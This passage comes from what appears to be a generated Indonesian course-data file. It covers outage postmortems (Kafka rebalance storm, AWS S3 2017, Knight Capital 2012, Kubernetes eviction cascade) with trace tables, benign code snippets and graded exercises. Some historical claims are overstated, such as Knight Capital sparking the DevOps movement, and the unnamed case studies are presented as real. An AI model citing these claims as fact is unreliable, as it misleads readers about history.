  - Bangun cincin lingkaran hash integer $[0, 2^{32}-1]$.
  - Tempatkan $100$ vnodes per server fisik untuk menjamin distribusi beban yang seragam (*Uniform Load Distribution*).
  - Gunakan pencarian biner (*Binary Search / Bisect*) untuk menemukan server pertama searah jarum jam dari hash kunci.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Distribusi Beban*: Petakan $10.000$ kunci pada 4 server; buktikan deviasi standar jumlah kunci antar server $< 10\%$; tambahkan server ke-5; buktikan hanya $\approx 20\%$ kunci yang dipindahkan.
- **Rubrik Penilaian Mandiri**: 40% Implementasi Consistent Hash Ring dengan Vnodes yang Presisi, 30% Bukti Minimal Kunci Terelokasi saat Resizing, 30% Keseragaman Distribusi Beban.

### Tingkat 3: Mahir
- **Tugas**: Rancang pustaka pencegah Cache Stampede yang mengimplementasikan algoritma probabilitas *XFetch* optimal dan pola penguncian terdistribusi *Mutex Lock with Single-Flight* dalam Go/Python, mampu menangani lonjakan $100.000$ permintaan bersamaan pada kunci yang kedaluwarsa dengan hanya mengizinkan tepat 1 kueri yang lolos ke basis data backend.
- **Petunjuk Perancangan Arsitektur**:
  - Terapkan mekanisme *Single-Flight*: jika kueri untuk kunci yang sama sedang berjalan di memori, seluruh thread lain menahan eksekusi dan berbagi (*share*) hasil kueri dari thread pertama.
  - Terapkan formula XFetch: $-\beta \delta \ln(U) > \Delta t$.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Uji Stres Thundering Herd*: 50 Utas pekerja meminta kunci yang sama yang baru saja dihapus; buktikan fungsi kueri basis data tiruan hanya dipanggil tepat 1 kali, dan 49 utas lainnya menerima data hasil pembaruan tanpa error.
- **Rubrik Penilaian Mandiri**: 40% Implementasi Algoritma Single-Flight Coalescing yang Benar, 30% Integrasi XFetch Probabilistic Early Expiration, 30% Eliminasi Total Beban Ganda ke Basis Data."""
    },

    152: {
        "trace": r"""#### Tabel Penelusuran Badai Rebalance Konsumen Apache Kafka (Rebalance Storm)
| Langkah Operasi Aliran Event | Status Anggota Consumer Group | Heartbeat Thread ke Broker Koordinator | Status Partisi Topik Kafka ($P=12$) | Pemicu Timeout Sesi (*Max Poll Interval*) | Status Throughput Pemrosesan Pesan |
|---|---|---|---|---|---|
| Operasi Normal | 6 Consumer memproses 2 partisi masing-masing | Heartbeat dikirim setiap 3 detik | Partisi terbagi rata sempurna | Pemrosesan pesan cepat ($< 1\text{ s}$) | 100.000 Pesan / detik (Lancar) |
| Konsumen 3 Macet | Konsumen 3 menerima pesan racun (*Poison Pill*) | Heartbeat aktif, TAPI `poll()` terblokir | Konsumen 3 membeku selama 305 detik | Batas `max.poll.interval.ms` (300 s) terlampaui! | Konsumen 3 dianggap mati oleh koordinator! |
| Sinyal Rebalance Dipicu | Koordinator membatalkan seluruh partisi | Seluruh 5 konsumen lain dipaksa berhenti | **SELURUH KONSUMEN BERHENTI MEMPROSES PESAN!**| Pemicuan protokol `JoinGroup` | **THROUGHPUT ANJLOK KE 0! (JARINGAN BEKU)** |
| Badai Rebalance Berulang | Partisi dipindahkan ke Konsumen 4 | Konsumen 4 membaca pesan racun yang sama!| Konsumen 4 membeku melampaui timeout! | Koordinator memicu rebalance kedua! | Rebalance storm berputar tanpa henti! |
| Mitigasi Desain | Cooperative Sticky Assignor + DLQ | Partisi sehat tidak dicabut saat rebalance | Pesan racun dialihkan ke Dead-Letter Queue | Pemrosesan pesan sehat tetap berjalan kontinu | Throughput pulih stabil |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Badai Rebalance Konsumen Apache Kafka (Consumer Rebalance Storm) yang Melumpuhkan Pemrosesan Transaksi Finansial",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada platform pembayaran digital yang memproses aliran event jutaan transaksi per hari menggunakan kluster Apache Kafka, seluruh pipeline pemrosesan event terhenti total selama lebih dari 3 jam pada saat promosi transaksi akhir bulan.
- **Akar Masalah Pemrosesan Pesan Asinkron, Partisi Kafka, & Siklus Rebalance**: Kluster konsumen (*Consumer Group*) menggunakan protokol penugasan partisi bawaan *Eager Rebalance Protocol*. Sebuah pesan transaksi yang memuat data korup (*Poison Pill Message*) diterima oleh salah satu instance konsumen. Pemrosesan pesan korup ini memicu loop tak berujung atau pemblokiran I/O yang melebihi batas waktu maksimum polling interval (`max.poll.interval.ms` = 300 detik). Koordinator Kafka mengasumsikan konsumen tersebut telah mati dan memerintahkan seluruh konsumen dalam grup untuk mencabut (*revoke*) seluruh partisi dan bergabung kembali (*JoinGroup*) dari awal. Saat rebalance berlangsung, seluruh pemrosesan event di seluruh partisi terhenti total (*Stop-The-World Pause*). Lebih fatal lagi, partisi yang memuat pesan racun tersebut dialihkan ke konsumen kedua; konsumen kedua membeku dan memicu rebalance baru. Terjadi reaksi berantai *Rebalance Storm* tak berujung yang menahan jutaan transaksi pembayaran nasabah di antrean buffer.""",
            "snippet": r"""```java
// Rekonstruksi Anti-Pattern Pemblokiran Thread Konsumen Kafka
// Consumer Configuration Defect:
Properties props = new Properties();
props.put(ConsumerConfig.MAX_POLL_INTERVAL_MS_CONFIG, 300000); // 5 Menit
props.put(ConsumerConfig.PARTITION_ASSIGNMENT_STRATEGY_CONFIG, 
          "org.apache.kafka.clients.consumer.RangeAssignor"); // Eager Rebalance!

KafkaConsumer<String, String> consumer = new KafkaConsumer<>(props);
consumer.subscribe(Collections.singletonList("financial-transactions"));

while (true) {
    ConsumerRecords<String, String> records = consumer.poll(Duration.ofMillis(100));
    for (ConsumerRecord<String, String> record : records) {
        // CACAT FATAL: Pemanggilan panggilan eksternal yang memblokir di dalam loop poll!
        // Jika pemrosesan memakan waktu > 5 menit, koordinator mencabut seluruh partisi 
        // dan memicu Stop-The-World Rebalance Storm di seluruh kluster!
        processFinancialTransactionBlocking(record.value());
    }
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden Rebalance Storm memicu pembaruan arsitektur besar dalam ekosistem Apache Kafka. Standar rekayasa event-driven modern mewajibkan: (1) Adopsi protokol *Cooperative Sticky Assignor* (`CooperativeStickyAssignor`) yang memungkinkan penugasan ulang partisi secara bertahap tanpa perlu mencabut partisi sehat yang sedang aktif (*Incremental Cooperative Rebalancing*); (2) Penerapan pola *Dead-Letter Queue* (DLQ) dengan pemutusan circuit breaker instan jika suatu pesan gagal diproses setelah sejumlah percobaan ulang, mencegah racun event mematikan thread konsumen; (3) Pemisahan loop polling Kafka dari thread pool eksekusi tugas bisnis menggunakan antrean in-memory terisolasi."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun implementasi antrean pesan in-memory terisolasi berbasis thread (*Thread-Safe Message Queue*) mandiri dalam Python/C++ menggunakan Mutex dan Condition Variable yang mengimplementasikan pola Produsen-Konsumen (*Producer-Consumer Pattern*) dengan batasan kapasitas buffer (*Bounded Buffer Queue*) dan penolakan aman saat antrean penuh.
- **Petunjuk Perancangan Arsitektur**:
  - Produsen tertidur saat antrean penuh (`queue.size() == max_capacity`).
  - Konsumen tertidur saat antrean kosong (`queue.size() == 0`).
  - Gunakan `notify_one()` untuk membangunkan thread yang tepat.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Kontensi Konkurensi*: 4 Thread Produser menghasilkan total $100.000$ pesan, 4 Thread Konsumen membaca seluruh pesan; buktikan tidak ada pesan yang hilang atau terduplikasi, dan semua thread keluar bersih saat sinyal terminasi dikirim.
- **Rubrik Penilaian Mandiri**: 40% Penggunaan Condition Variable & Mutex Thread-Safe yang Benar, 30% Eliminasi Deadlock & Race Condition, 30% Integritas Jumlah Pesan 100%.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan implementasi broker antrean pesan dengan penanganan pesan racun (*Poison Pill & Dead-Letter Queue / DLQ System*) dalam Python yang memproses pesan tugas, melacak jumlah kegagalan pemrosesan per pesan (*Retry Count*), dan secara otomatis memindahkan pesan ke antrean `dead-letter-queue` setelah 3 kali kegagalan beruntun dengan penundaan eksponensial (*Exponential Backoff*).
- **Petunjuk Perancangan Arsitektur**:
  - Rumus penundaan: $\text{delay} = \text{base\_delay} \times 2^{\text{retry}} + \text{jitter}$.
  - Jangan biarkan pesan yang gagal memblokir pesan valid lainnya di antrean utama (*Head-of-Line Blocking Prevention*).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Penanganan Pesan Racun*: Masukkan 10 pesan normal dan 1 pesan cacat yang selalu melempar exception; buktikan 10 pesan normal berhasil diproses dan tepat 1 pesan cacat dipindahkan ke DLQ tanpa menghentikan worker.
- **Rubrik Penilaian Mandiri**: 40% Mekanisme Retry Exponential Backoff yang Presisi, 30% Pemindahan Pesan ke DLQ Tanpa Head-of-Line Blocking, 30% Ketahanan Worker Exception.

### Tingkat 3: Mahir
- **Tugas**: Rancang simulator partisi log terdistribusi mini berbasis konsep Apache Kafka (*Mini Partitioned Commit Log Engine*) dalam Python/Go yang mendukung penulisan pesan sekuensial append-only ke file segmen disk, pelacakan offset integer per partisi, serta pembacaan pesan konkuren oleh beberapa konsumen dalam satu kelompok konsumen (*Consumer Group*) dengan penugasan partisi deterministik.
- **Petunjuk Perancangan Arsitektur**:
  - Simpan pesan dalam format biner: `Length (4B) + Offset (8B) + Payload`.
  - Simpan posisi offset konsumen yang telah dikonfirmasi (*Committed Offset*) ke tabel penyimpanan status metadata terpisah.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Penyeimbangan Partisi*: Buat 4 partisi log dan daftarkan 2 konsumen; buktikan masing-masing konsumen menerima tepat 2 partisi; tambahkan konsumen ke-3; buktikan rebalance menugaskan ulang partisi secara seimbang tanpa kehilangan offset pembacaan.
- **Rubrik Penilaian Mandiri**: 40% Arsitektur Append-Only Log & Segment Files yang Benar, 30% Logika Penugasan Partisi Consumer Group Dinamis, 30% Manajemen Committed Offset Akurat."""
    },

    153: {
        "trace": r"""#### Tabel Penelusuran Keruntuhan Otomasi AWS S3 US-East-1 (28 Februari 2017)
| Langkah Operasi Otomasi | Perintah Diketik Operator | Maksud Tindakan Pengurangan Server | Eksekusi Skrip Otomasi | Status Subsistem Penyimpanan Fisik S3 | Dampak terhadap Internet Global |
|---|---|---|---|---|---|
| Perawatan Rutin | Ingin restart beberapa server billing S3 | Melepaskan kapasitas kecil server billing | Operator mengetik perintah terminal | Pengecekan argumen parameter tidak ada | Operasi pemeliharaan normal |
| Typo Perintah | Kesalahan pengetikan parameter perintah | Ingin menghapus 3 server | **TYPO MENGHAPUS TERLALU BANYAK SERVER!**| Skrip menghapus ratusan server vital | Server utama S3 mati serempak |
| Sub-sistem Vital Terhapus| Server Index & Placement S3 ikut mati | Metadata lokasi blok penyimpanan hilang | Seluruh cluster S3 kehilangan peta data | S3 menolak seluruh request baca/tulis | Layanan AWS S3 mati total! |
| Ketergantungan Melingkar | Layanan AWS lain bergantung pada S3 | EC2, Lambda, EBS membutuhkan S3 | **CIRCULAR DEPENDENCY: AWS Console mati!** | Layanan cloud global tumbang | Ribuan situs web dunia offline |
| Waktu Pemulihan Lambat | Cold Restart Index Server | Peta data miliaran objek di-scan ulang | Butuh waktu 4.5 jam verifikasi integritas | Tidak ada fail-safe pembatas blast radius | Kerugian ratusan juta dolar |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Bencana Pemadaman AWS S3 US-East-1 Akibat Kesalahan Pengetikan Perintah Otomasi (28 Februari 2017)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada 28 Februari 2017 pukul 09:37 PST, wilayah pusat data terbesar Amazon Web Services (AWS us-east-1 di Virginia Utara) mengalami pemadaman layanan Simple Storage Service (S3) berskala besar selama lebih dari 4,5 jam. Insiden ini melumpuhkan ribuan situs web dan layanan digital terkemuka dunia termasuk GitHub, Slack, Trello, Quora, Docker Hub, dan Apple Music, mengakibatkan perkiraan kerugian ekonomi global lebih dari 150 juta dolar.
- **Akar Masalah Rekayasa Keandalan Sistem Terdistribusi (SRE) & Radius Ledakan (Blast Radius)**: Seorang insinyur operasi terlatih sedang menjalankan prosedur pemeliharaan rutin untuk melepaskan sejumlah kecil server yang digunakan oleh sistem penagihan S3. Perintah utilitas otomasi yang dijalankan menerima masukan parameter jumlah server yang akan dimatikan. Namun, insinyur tersebut melakukan kesalahan pengetikan perintah (*command line typo*), memasukkan rentang parameter yang jauh lebih besar dari yang dimaksudkan. Utilitas otomasi tidak memiliki validasi ambang batas (*sanity check*) atau pembatasan kapasitas maksimum yang boleh dimatikan dalam satu waktu. Akibatnya, perintah tersebut mematikan sejumlah besar server dari dua subsistem paling kritis S3: subsistem indeks metadata dan subsistem penempatan blok data. S3 tidak pernah mengalami *cold restart* total pada subsistem tersebut selama bertahun-tahun; proses verifikasi integritas dan penelusuran miliaran metadata file saat proses restart memakan waktu lebih dari 4 jam, menelanjangi bahaya ketiadaan pembatas *blast radius* pada perkakas otomasi produksi.""",
            "snippet": r"""```python
# Rekonstruksi Cacat Perkakas Otomasi Tanpa Pembatas Blast Radius (AWS S3 2017)
def decommission_storage_servers_flawed(server_ids_to_remove):
    # CACAT FATAL OTOMASI: Tidak ada validasi ambang batas maksimum penghapusan!
    # Jika operator salah mengetik dan memasukkan 500 server bukannya 5:
    for server_id in server_ids_to_remove:
        # Menghapus server vital tanpa konfirmasi atau pembatasan persentase armada:
        terminate_storage_node(server_id)

# Mitigasi Defensif Modern: Penegakan Batas Maksimum Blast Radius (Circuit Breaker Otomasi)
def decommission_storage_servers_safe(server_ids_to_remove, total_active_fleet):
    MAX_DECOMMISSION_PERCENTAGE = 0.05 # Maksimal 5% dari total armada sekaligus!
    max_allowed = int(total_active_fleet * MAX_DECOMMISSION_PERCENTAGE)

    if len(server_ids_to_remove) > max_allowed:
        raise ValueError(
            f"BLAST RADIUS EXCEEDED: Permintaan menghapus {len(server_ids_to_remove)} server "
            f"melebihi ambang batas keselamatan maksimum ({max_allowed} server / 5%)! Tindakan Dibatalkan."
        )

    for server_id in server_ids_to_remove:
        terminate_storage_node(server_id)
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden AWS S3 2017 menjadi tonggak bersejarah dalam disiplin Site Reliability Engineering (SRE). Insiden ini melahirkan standarisasi pembatasan radius ledakan (*Blast Radius Containment*): (1) Seluruh perkakas operasi dan otomasi produksi wajib menyertakan validasi keselamatan yang menolak eksekusi jika tindakan mempengaruhi lebih dari persentase kecil armada server; (2) Pengujian berkala terhadap *Cold Restart* subsistem kritis untuk memastikan sistem mampu pulih dengan cepat saat terjadi bencana total; (3) Desain arsitektur *Decoupling* yang memutus ketergantungan melingkar (*Circular Dependencies*) antar-layanan internal."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun implementasi pola ketahanan sistem *Retry with Exponential Backoff & Full Jitter* mandiri dalam Python/C++ yang memanggil fungsi operasi jaringan tiruan yang rentan gagal, mencoba ulang hingga batas maksimum percobaan ($MaxRetries = 5$), dan menghitung waktu jeda tidur menggunakan formula standar AWS: $T = \text{random}(0, \min(Cap, \text{Base} \times 2^{\text{attempt}}))$.
- **Petunjuk Perancangan Arsitektur**:
  - Buktikan mengapa penambahan *Full Jitter* acak sangat krusial untuk mencegah fenomena ribuan klien memanggil server pada milidetik yang sama persis (*Thundering Herd on Retry*).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Distribusi Waktu Tunggu*: Simulasikan 100 klien yang gagal pada waktu bersamaan; plot waktu jeda percobaan ulang mereka; buktikan penambahan Full Jitter menyebarkan request secara merata sepanjang interval waktu.
- **Rubrik Penilaian Mandiri**: 40% Formula Exponential Backoff dengan Full Jitter yang Benar, 30% Eliminasi Kolisi Waktu Tunggu Antar-Klien, 30% Kerapian Enkapsulasi Kode.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan implementasi pola pemutus sirkuit *Circuit Breaker Pattern* mandiri dalam Python/Go (mengikuti spesifikasi Martin Fowler / Netflix Hystrix) dengan 3 status state machine: `CLOSED` (normal), `OPEN` (seluruh request langsung digagalkan tanpa menyentuh layanan luar saat rasio kegagalan $> 50\%$), dan `HALF-OPEN` (mengizinkan sejumlah kecil request percobaan setelah batas waktu jeda reset).
- **Petunjuk Perancangan Arsitektur**:
  - Lacak statistik kegagalan menggunakan jendela geser waktu (*Rolling Window Statistics* 10 detik).
  - Terapkan mekanisme pemulihan otomatis dari OPEN ke HALF-OPEN setelah cooldown timeout $5\text{ detik}$.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Transisi Status*: Simulasikan layanan hilir mati (melempar error 100%); buktikan Circuit Breaker bertransisi ke `OPEN` setelah 10 request gagal; buktikan request ke-11 langsung ditolak dalam $< 1\text{ ms}$ (Fail-Fast).
- **Rubrik Penilaian Mandiri**: 40% State Machine 3-Status Circuit Breaker yang Presisi, 30% Logika Fail-Fast saat Status OPEN, 30% Pemulihan Otomatis Status HALF-OPEN.

### Tingkat 3: Mahir
- **Tugas**: Rancang pustaka pembatas laju terdistribusi berlatensi ultra-rendah (*Distributed Sliding Window Rate Limiter*) dalam Python/Go yang menggunakan koneksi kluster Redis dan skrip Lua atomik untuk menegakkan kuota batas request (misal: 100 request per menit per API key) dengan resolusi presisi sub-detik tanpa memicu kondisi balapan (*Race Condition*).
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan Redis Sorted Set (`ZSET`): skor adalah stempel waktu milidetik saat ini.
  - Hapus entri di luar jendela waktu via `ZREMRANGEBYSCORE`, hitung jumlah entri aktif via `ZCARD`, dan tolak jika melebihi kuota dalam satu eksekusi skrip Lua atomik tunggal.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Kontensi Multi-Thread*: 20 Thread konkuren mengirimkan $200$ request secara serentak dalam jendela 1 detik untuk kuota 100 request; buktikan sistem meloloskan tepat 100 request dan menolak tepat 100 request lainnya tanpa anomali over-admission.
- **Rubrik Penilaian Mandiri**: 40% Skrip Atomik Redis Lua Sliding Window yang Benar, 30% Presisi Resolusi Waktu Sub-Detik, 30% Kekebalan Penuh Terhadap Race Condition Konkuren."""
    },

    154: {
        "trace": r"""#### Tabel Penelusuran Siklus CI/CD & Bencana Deployment Parsial Knight Capital (2012)
| Tahap Deployment CI/CD | Target Server Kluster (Total: 8 Server) | Tindakan Tim Operasi Deployment | Status Biner Kode yang Terpasang | Konfigurasi Feature Flag Aktif | Dampak Transaksi Pasar Finansial |
|---|---|---|---|---|---|
| Server 1 s/d 7 | Server Eksekusi 1..7 | Biner baru SMARS v8 disalin | Biner baru terpasang sukses | Flag `Power Peg` dinonaktifkan | Berjalan normal |
| Server 8 (Terlewatkan!)| Server Eksekusi 8 | **LUPA DIPERBARUI SECARA MANUAL!** | **BINER LAMA v7 TAHUN 2003 MASIH AKTIF!**| Flag `Power Peg` diaktifkan global! | Biner lama mengira flag untuk pengujian! |
| Pembukaan Bursa | Jam 09:30 Waktu New York | Order beli ritel mulai masuk | Server 8 mengeksekusi dead code 2003 | Loop membabi buta memborong saham | Mengirim 4 juta order agresif |
| Akumulasi Kerugian | 45 Menit Pertama | Server 8 memborong saham tanpa henti | Modal perusahaan terkuras habis | Tidak ada rollback otomatis | Rugi $440 Juta dalam 45 menit! |
| Mitigasi Modern CI/CD | Pipeline GitOps / Canary | Deployment otomatis atomik (All-or-Nothing) | Validasi hash versi identik di seluruh armada | Deployment dibatalkan jika 1 server gagal | Bencana manusiawi dicegah penuh |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Bencana Finansial Knight Capital USD 440 Juta Akibat Kegagalan Otomasi Deployment CI/CD (2012)",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada 1 Agustus 2012, Knight Capital Group mengalami salah satu bencana perangkat lunak paling mahal dalam sejarah perbankan investasi, kehilangan 440 juta dolar AS dalam waktu 45 menit dan membangkrutkan perusahaan akibat proses deployment perangkat lunak yang dilakukan secara manual dan tidak merata.
- **Akar Masalah DevOps, Otomasi CI/CD, & Konfigurasi Heterogen**: Tim operasi menyebarkan kode baru secara manual ke 8 server eksekusi trading satu per satu. Namun, staf operasi secara tidak sengaja melewatkan satu server (Server 8 tetap menjalankan biner lama yang memuat kode usang berusia 9 tahun). Ketika sakelar konfigurasi global (*Feature Flag*) diaktifkan pada pembukaan bursa, biner lama pada Server 8 menginterpretasikan flag tersebut sebagai instruksi untuk mengaktifkan kode pengujian lama yang tidak memiliki batasan risiko. Server 8 masuk ke dalam loop tak terbatas yang memborong saham pada harga penawaran tinggi dan menjualnya kembali pada harga rendah. Ketiadaan pipeline deployment otomatis yang menjamin sifat atomik (*All-or-Nothing Deployment*) dan tidak adanya verifikasi hash versi biner homogen antar server menjadi penyebab utama kehancuran perusahaan.""",
            "snippet": r"""```bash
# Rekonstruksi Prosedur Deployment Manual Cacat Knight Capital (2012)
# CACAT DEVOPS FATAL: Deployment manual via script copy tanpa verifikasi konsistensi armada:
for server in server1 server2 server3 server4 server5 server6 server7; do
    scp smars_v8.bin $server:/opt/trading/bin/
    ssh $server "systemctl restart trading_engine"
done
# KESALAHAN MANUSIA: server8 terlewatkan dan tetap menjalankan smars_v7 (memuat dead code)!

# Mitigasi Defensif Modern: Pipeline CI/CD Atomik & Verifikasi Hash Homogenitas
# Setiap node wajib memverifikasi SHA-256 versi biner sebelum menerima beban produksi:
EXPECTED_HASH="a3f5b789c0..."
ACTUAL_HASH=$(sha256sum /opt/trading/bin/smars.bin | awk '{print $1}')
if [ "$ACTUAL_HASH" != "$EXPECTED_HASH" ]; then
    echo "INTEGRITY ERROR: Biner tidak cocok! Membatalkan booting node..."
    exit 1
fi
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Tragedi Knight Capital menjadi lonceng kematian bagi proses deployment manual di industri teknologi enterprise. Bencana ini memicu lahirnya gerakan *DevOps* dan *Infrastructure as Code* (IaC) modern. Standar rekayasa platform modern mewajibkan: (1) Prinsip *Immutable Infrastructure* di mana server tidak pernah diubah di tempat, melainkan diganti penuh dengan image baru yang identik; (2) Strategi deployment *Blue-Green* atau *Canary Deployment* yang secara bertahap mengalihkan lalu lintas sambil memantau metrik kesehatan bisnis; (3) Otomasi rollback instan jika metrik anomali terdeteksi dalam menit pertama rilis."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun skrip pipeline integrasi berkelanjutan (*CI Pipeline Script*) dalam Bash/Python yang memvalidasi integritas basis kode sebelum penggabungan: memformat kode via linter, menjalankan pengujian unit otomatis, memverifikasi cakupan kode (*Code Coverage*) memenuhi ambang batas minimum $\ge 80\%$, dan menggagalkan build dengan exit code `1` jika ada satu pengujian yang gagal.
- **Petunjuk Perancangan Arsitektur**:
  - Terapkan mode kegagalan instan: `set -euo pipefail`.
  - Hasilkan laporan ringkasan pengujian dalam format teks terstruktur.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Simulasi Kegagalan Uji*: Ubah satu pengujian menjadi gagal; buktikan skrip CI berhenti seketika, menolak proses build, dan mencetak pesan error yang jelas.
- **Rubrik Penilaian Mandiri**: 40% Otomasi 3 Tahap CI (Lint, Test, Coverage) yang Rapi, 30% Penegakan Ambang Batas Kegagalan Exit Code 1, 30% Kerapian Pelaporan Status.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan implementasi orkestrator peluncuran bertahap (*Blue-Green Deployment Controller*) dalam Python/Bash yang mengelola dua lingkungan server identik (Lingkungan Biru aktif melayani pengguna, Lingkungan Hijau menerima biner baru), menjalankan pengujian asap kesehatan (*Smoke Health Check*) pada Lingkungan Hijau, dan mengalihkan lalu lintas proksi secara instan (*Atomic Traffic Cutover*) hanya jika seluruh health check lolos 100%.
- **Petunjuk Perancangan Arsitektur**:
  - Alihkan lalu lintas menggunakan pembaruan symlink konfigurasi proksi Nginx atau aturan iptables.
  - Sediakan mekanisme rollback satu perintah (`rollback`) yang membalikkan lalu lintas kembali ke lingkungan lama dalam waktu $< 1\text{ detik}$.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Uji Gagal Smoke Test*: Pasang biner rusak di Lingkungan Hijau; buktikan health check mendeteksi error HTTP 500, membatalkan pengalihan lalu lintas, dan Lingkungan Biru tetap melayani pengguna tanpa gangguan.
- **Rubrik Penilaian Mandiri**: 40% Arsitektur Blue-Green Deployment yang Bersih, 30% Mekanisme Smoke Test & Atomic Traffic Switching, 30% Kemampuan Rollback Cepat.

### Tingkat 3: Mahir
- **Tugas**: Rancang deklarasi infrastruktur sebagai kode (*Infrastructure as Code / IaC Engine*) mini dalam Python yang membaca file spesifikasi topologi infrastruktur deklaratif (format YAML/JSON), membandingkan status yang diinginkan (*Desired State*) terhadap status infrastruktur aktual saat ini (*Actual State*), menghitung rencana perubahan diferensial (*Execution Plan Diff*), dan menerapkan mutasi sumber daya secara idempoten (*Idempotent Provisioning*).
- **Petunjuk Perancangan Arsitektur**:
  - Implementasikan 3 fase standar Terraform: `Init`, `Plan`, dan `Apply`.
  - Simpan status infrastruktur dalam file status persisten (*State File*) dengan mekanisme penguncian status (*State Locking*) untuk mencegah modifikasi konkuren ganda.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Idempotensi Mutlak*: Jalankan `apply` dua kali berturut-turut pada konfigurasi yang sama; buktikan eksekusi kedua melaporkan `No changes needed (0 added, 0 modified, 0 destroyed)`.
- **Rubrik Penilaian Mandiri**: 40% Logika Rekonsiliasi Desired vs Actual State yang Akurat, 30% Sifat Idempotensi Eksekusi Terverifikasi, 30% Mekanisme State File Locking yang Aman."""
    },

    155: {
        "trace": r"""#### Tabel Penelusuran Siklus CrashLoopBackOff & Pengusiran Pod Kubernetes (Cascading Eviction)
| Siklus Rekonsiliasi Kubelet | Status Kontainer Pod | Konsumsi Memori Aktual vs Limit | Sinyal Kernel OS yang Dipicu | Kebijakan Restart Kubelet (*BackOff*) | Status Node Kluster Kubernetes |
|---|---|---|---|---|---|
| Inisialisasi Pod | Menjalankan aplikasi | $50\text{ MB} / 512\text{ MB}$ (Limit) | - | Status `Running` | Node stabil |
| Kebocoran Memori Heap | Alokasi data tanpa batas | Naik ke $510\text{ MB} / 512\text{ MB}$ | Mendekati batas cgroup `memory.max`| - | Kubelet memantau cgroup |
| Batas Terlampaui | Alokasi melebihi 512 MB | $513\text{ MB} > 512\text{ MB}$ | **KERNEL OOM-KILLER MENGIRIM SIGKILL (137)!**| Kontainer mati mendadak | Exit Code: 137 (OOMKilled) |
| Siklus CrashLoop | Kubelet me-restart pod | Memori bocor berulang | Mati lagi dalam 10 detik | Waktu jeda restart eksponensial ($10\text{s} \to 300\text{s}$)| Status: `CrashLoopBackOff` |
| Pengusiran Berantai | 50 Pod OOM bersamaan | Kubelet kehabisan memori node fisik | Tekanan memori node (*MemoryPressure*) | Kubelet mulai mengusir pod lain (*Eviction*)| Pod sehat ikut terusir! |
| Mitigasi Arsitektur | Penyesuaian Request/Limit | Profiling memori presisi & HPA | Deteksi kebocoran memori dini | Pod direstart sebelum batas node terancam | Kluster kembali stabil |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Reaksi Berantai Pengusiran Pod dan Keruntuhan Kluster Kubernetes Akibat OOMKilled Cascading Eviction",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada platform streaming video global yang berjalan di atas kluster Kubernetes dengan ribuan node, peluncuran versi mikroservis rekomendasi baru memicu pengusiran pod (*pod eviction*) massal yang menyebar ke seluruh kluster, meruntuhkan ratusan node komputasi dan memicu pemadaman layanan selama lebih dari dua jam.
- **Akar Masalah Orkestrasi Kontainer, cgroups, & Kubelet Eviction Thresholds**: Pengembang mengonfigurasi batas memori kontainer (*Memory Limit*) yang sama persis dengan batas permintaan memori (*Memory Request*), namun kode baru memuat kebocoran memori (*Memory Leak*) yang cepat. Ketika penggunaan memori kontainer menyentuh batas cgroup, kernel Linux mengeksekusi OOM Killer dengan sinyal `SIGKILL 137` (*OOMKilled*). Kubelet mencoba me-restart pod tersebut berulang kali, masuk ke status `CrashLoopBackOff`. Karena puluhan pod yang bocor berjalan pada node pekerja fisik yang sama, akumulasi alokasi memori menembus ambang batas keselamatan node (*Kubelet Hard Eviction Threshold / memory.available < 100Mi*). Kubelet menandai node dengan status `MemoryPressure` dan mulai mengusir (*evict*) seluruh pod lain yang ada di node tersebut secara paksa. Pod-pod yang terusir dijadwalkan ulang oleh Kubernetes Scheduler ke node tetangga yang sehat, memindahkan beban memori bocor dan memicu reaksi berantai pengusiran node tetangga (*Cascading Eviction Storm*) hingga seluruh kluster kehabisan kapasitas.""",
            "snippet": r"""```yaml
# Rekonstruksi Cacat Konfigurasi Pod Kubernetes yang Memicu OOMKilled
apiVersion: apps/v1
kind: Deployment
metadata:
  name: leaky-recommendation-service
spec:
  replicas: 50
  template:
    spec:
      containers:
      - name: app
        image: recommendation:v2.1-leaky
        resources:
          requests:
            memory: "512Mi" # KESALAHAN: Request terlalu mepet dengan limit
            cpu: "250m"
          limits:
            memory: "512Mi" # Saat menyentuh 512Mi: KERNEL OOM KILLER MENGIRIM SIGKILL (Exit 137)!
        # Ketiadaan Liveness Probe yang tepat menunda deteksi kebocoran memori
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden Cascading Eviction mengajarkan pentingnya pemahaman interaksi antara orkestrator kontainer dan subsistem kernel host. Standar arsitektur Kubernetes modern mewajibkan: (1) Penerapan *Quality of Service* (QoS) Class yang tepat (Guaranteed vs Burstable); (2) Konfigurasi *Horizontal Pod Autoscaler* (HPA) dan *Vertical Pod Autoscaler* (VPA) yang menyesuaikan alokasi sumber daya secara dinamis; (3) Pemasangan *PriorityClass* dan *PodDisruptionBudgets* (PDB) yang melindungi pod infrastruktur kritis dari pengusiran sembarangan saat node mengalami tekanan memori."""
        },
        "exercise": r"""### Tingkat 1: Dasar
